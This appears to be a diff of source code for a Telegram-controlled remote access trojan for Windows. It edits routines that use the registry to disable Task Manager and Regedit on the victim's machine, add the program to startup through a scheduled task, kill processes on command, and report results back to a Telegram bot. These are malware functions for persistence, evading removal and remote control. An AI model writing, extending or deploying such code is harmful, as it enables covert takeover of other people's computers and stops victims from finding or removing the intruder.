@@ -160,44 +160,41 @@ if AdminRightsRequired is True:
 				pass
 			else:
 				print('[+] › ' + CurrentName + ' opened as admin rights\n')
-				break
-
-
-# Checks if the file is running as an administrator
-
-if AdminRightsRequired is True:
-	if Admin() is False:
-		sys.exit()
+				sys.exit()
 
 
 # Disables TaskManager
 
 if DisableTaskManager is True:
 
-	if Admin() is False:
-		print('[-] › This function requires admin rights\n')
+	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
+		print('[+] › taskmgr.exe is already disabled\n')
 
-	if Admin() is True:
-		try:
+	else:
+		if Admin() is False:
+			print('[-] › This function requires admin rights\n')
+
+		if Admin() is True:
 			RegeditDisableTaskManager()
+			open(Directory + 'RegeditDisableTaskManager', 'a').close()
 			print('[+] › taskmgr.exe has been disabled\n')
-		except:
-			print('[+] › taskmgr.exe is already disabled\n')
 
 
 # Disables Regedit
 
 if DisableRegistryTools is True:
 
-	if Admin() is False:
-		print('[-] › This function requires admin rights\n')
+	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
+		print('[+] › regedit.exe is already disabled\n')
 
-	if Admin() is True:
-		try:
+	else:
+		if Admin() is False:
+			print('[-] › This function requires admin rights\n')
+
+		if Admin() is True:
 			RegeditDisableRegistryTools()
+			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
 			print('[+] › regedit.exe has been disabled\n')
-		except:
-			print('[+] › regedit.exe is already disabled\n')
 
 
 # Adds a program to startup
@@ -206,6 +203,7 @@ if AutorunEnabled is True:
 
 	if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
 		print('[+] › ' + CurrentName + ' ‹ is already in startup › ' + InstallPath + ProcessName + '\n')
+
 	else:
 		if Admin() is False:
 			print('[-] › This function requires admin rights\n')
@@ -348,9 +346,7 @@ def Audio(command):
 
 def SendMessage(call, text):
 	try:
-
 		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
-
 	except:
 		pass
 
@@ -774,9 +770,6 @@ def Taskkill(command):
 			Process = Process + '.exe'
 
 		bot.reply_to(command, 'The process *' + Process + '* has been stopped!', parse_mode='Markdown')
-
-	except subprocess.CalledProcessError:
-		bot.reply_to(command, 'The process *' + Process + '* not found.', parse_mode='Markdown')
 
 	except:
 		bot.send_message(command.chat.id, 
